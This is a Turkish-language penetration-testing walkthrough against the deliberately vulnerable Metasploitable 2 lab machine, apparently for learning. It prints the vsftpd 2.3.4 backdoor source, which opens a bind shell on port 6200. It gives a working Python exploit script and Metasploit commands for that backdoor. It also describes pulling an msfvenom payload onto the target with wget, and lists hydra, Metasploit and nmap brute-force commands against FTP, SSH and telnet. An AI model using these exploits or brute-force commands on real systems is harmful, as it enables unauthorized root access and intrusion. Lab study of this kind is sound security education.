## Metasploitable 2

`nmap -sS -sV -Pn -n --top-ports 10 -o nmap.txt 192.168.1.41` Şeklinde metasploitable 2 üzerinde bir nmap taraması gerçekleştirdim.

> 21/tcp   open   ftp           vsftpd 2.3.4

Yukarıdaki satırda 21. portta ftp servisinin çalıştığı görünüyor ve bize sürümü verilmiş 21. porta odaklanıp neler yapabileceğimize bakalım (`nmap 192.168.1.41 -p 21 –script vuln şeklinde bir tarama ilede zafiyet tespit edilebilir).` Bunun yanında **“searchsploit”** aracı ile **“exploit-db”** üzerinde arama da gerçekleştirilebilir.

FTP Protokolünün **vsftpd 2.3.4** versiyonunda bir güvenlik zafiyeti var, güvenlik zafiyetinin açığa çıktığı dosta **str.c** isimli dosyanın aşağıdaki satırında ortaya çıkıyor.

```c
ınt
 str_contains_line(const struct mystr* p_str, const struct mystr* p_line_str){
static struct mystr s_curr_line_str;
unsigned int pos = 0;
while (str_getline(p_str, &s_curr_line_str, &pos)){
    if (str_equal(&s_curr_line_str, p_line_str)){
        return 1;}
    else if((p_str->p_buf[i]==0x3a) && (p_str->p_buf[i+1]==0x29)){
        vsf_sysutil_extra();}}
return 0;}
```

Burada zaten her şey ortada. Alınan dize değerini ayrıştırma sırasıda **p_buf[i]==0x3a && p_buf[i+]==0x29 ise vsf_sysutil_extra()** isimli fonksiyonu çağırıyor. Burada ki hex **0x3a ‘:’, 0x29 ise ASCII ‘)’ tekabul ediyor yani “\x3a\x29” == ‘:)’ smileyy :). vsf_sysutil_extra()** fonksiyonunun içeriği ise aşağıdaki gibi.

```c
//sysdeputil.c
int
vsf_sysutil_extra(****)
{
  int fd, rfd;
  struct sockaddr_in sa;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  exit(1); 
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(6200);
  sa.sin_addr.s_addr = INADDR_ANY;
  if((bind(fd,(struct sockaddr *)&sa,
  sizeof(struct sockaddr))) < 0) exit(1);
  if((listen(fd, 100)) == -1) exit(1);
  for(;;)
  { 
    rfd = accept(fd, 0, 0);
    close(0); close(1); close(2);
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh","sh",(char *)0); 
  }}
```

Daha önce **soket** programlama ile ilgilendiyseniz burayı rahatlıkla anlayabilirsiniz burada **6200** portu dinleniyor ve gelen bağlantı kabul edilip bütün veriler **"/bin/sh"** (Bu satırdan anlayabiliriz `execl("/bin/sh","sh",(char *)0);`) shell inde çalıştırılarak çıktısı karşıya gönderiliyor. Yaani Kısacası ben netcat ile 21. porta bağlanıp kullanıcı adımın **":)"** karakterlerini içerecek şekilde girersem ve parolayıda kafamdan sallarsam bu fonksiyon çalışacak ve ben tekrardan **6200** portundan netcat ile bağlanıp sistemde bir arkakapı açmış olacağım hemen deniyelim. `netcat 192.168.1.41 21` Şeklinde 21. porta bağlandıktan sonra **"USER erdogan:)" ve "PASS salladım"** şeklinde bir veri girdim daha sonra yeni terminal açıpta netcat `192.168.1.41 6200` komutunu çalıştırarak sisteme sızmayı başardım whoami komutunu çalıştırdıktan sonra root çıktısını gördüm sistemde root olduktan sonrada artık her şey yapabiliriz.

Güvenlik Açığını tespit ettikten sonra istersen kendi scriptimizi de yazabiliriz.

```python
#! /usr/bin/env python3
#-*- coding:UTF-8 -*-
import sys,os,socket
if __name__ == '__main__':
	if len(sys.argv) != 3:
		print('\033[91m' + '[!] Usage: python3 exploit_vsftpd_2.3.4.py [TARGET_IP] [PORT]' +'\033[0m')
	target,port = sys.argv[1],sys.argv[2]
	print('\033[93m' + "Target: {}:{}".format(target,port) + '\033[0m')
	socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
	try:
		socket.connect((target,int(port)))
	except KeyboardInterrupt:
		sys.exit()
	except Exception:
		print('\033[91m' + "[!] Can't connected to target please check your entery ..." + '\033[0m')
	try:
		version = socket.recv(1024).decode('UTF-8')
		if '220 (vsFTPd 2.3.4)' in version:
			socket.send('USER hi:)\n'.encode('UTF-8'))
			socket.recv(1024).decode('UTF-8')
			socket.send('PASS iamroot\n'.encode('UTF-8'))
			socket.close()
			print('\033[92m' + '[-] Netcat starting ... \n[-] You are IN ...' + '\033[0m')
			os.system('netcat {} 6200'.format(target))
		else: print('\033[91m' + "[!] 220 (vsFTPd 2.3.4) is not working on port: {}".format(port) + '\033[0m')
	except KeyboadInterrupt:
		sys.exit()
	except Exception:
		print('\033[91m' + "[!] Can't connected to target please check your entery ...\n[!] Maybe NetCat is not 
installed on your system please check it ..." + '\033[0m')

```

Yukarıda güvenlik python ile yazılmış bir script var bu zafiyeti sömürmek için kullanılabilir. Sisteme girdikten sonra `python -c "import pty; pty.spawn('/bin/bash')"` komutu ile bir bash shell acılabilir. Metasploit ilede sömürülebilir vsftpd 2.3.4 için yazılmış exploit mevcut metasploitte.

```bash
msfconsole -q
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOST 192.168.1.41
set RPORT 21
exploit
```

Sisteme sızdıktan sonra msfvenom ile .elf formatında bir backdoor oluşturup hedef sistemden wget komutu ile çekip çalıştırdıktan sonra meterpreter session alabiliriz.

Bunların dışında ftp portuna hydra aracı ile kaba kuvvet saldırısıda yapılabilir.

`hydra -t 2 -L [users.txt] -P [pass.txt] -M [target_ıp_file] -s [port] ftp`

> 22/tcp   open   ssh           OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

Yularıdaki satırda 22. portta ssh servisinin çalıştığını görüyoruz ve sürümüde hemen karşısında yazıyor internette araştırma yaparak ssh ın bu sürümüne ait bir zafiyet farmı ona bakalım. Bu aşamada 22. porta kaba kuvvet saldırısı yapabiliriz. Bunun için metasploitte "ssh" diye bir arama yapalım.

```bash
msfconsole -q
search ssh
```

`auxiliary/scanner/ssh/ssh_login` İşimize yarayabilir.

```bash
use auxiliary/scanner/ssh/ssh_login
show options
set RHOST 192.168.1.41
set RPORT 22
set USER_AS_PASS true
set USER_FILE /home/eredot_pkfr/Desktop/user.txt
set USERPASS_FILE /home/eredot_pkfr/Desktop/pass.txt
```

Bize msfadmin:msfadmin şeklinde giriş yapmayı denediğini ve başarılı olduğunu söylüyor kullanıcı adı ve parolayı bulduk şimdi ise `ssh msfadmin@192.168.1.41` komutunu çalıştırıp sisteme msfadmin kullanıcısı olarak giriş yapabiliriz. Kaba Kuvvet saldırısı için hydra Script te kullanılabilir.

`hydra -t 4 -L /home/eredot_pkfr/Desktop/user.txt -P /home/eredot_pkfr/Desktop/pass.txt ssh://192.168.1.41`

Nmap içerisindeki NSE scriptleride kullanılabilir.

`nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s 192.168.1.41`

> 23/tcp   open   telnet        Linux telnetd

```bash
msfconsole
use auxiliary/scanner/telnet/telnet_login
set rhosts 192.168.1.41
set user_file /home/eredot_pkfr/Desktop/user.txt
set pass_file /home/eredot_pkfr/Desktop/pass.txt
set stop_on_success true
exploit
```

> [+] 192.168.1.41:23       - 192.168.1.41:23 - Login Successful: msfadmin:msfadmin

Satırını yakladık kaba kuvvet saldırısı ile telnet kullanıcı adı ve parolasını ele geçirdik. şimdi ise telnet bağlantısı kurabiliriz. `telnet 192.168.1.41 23`

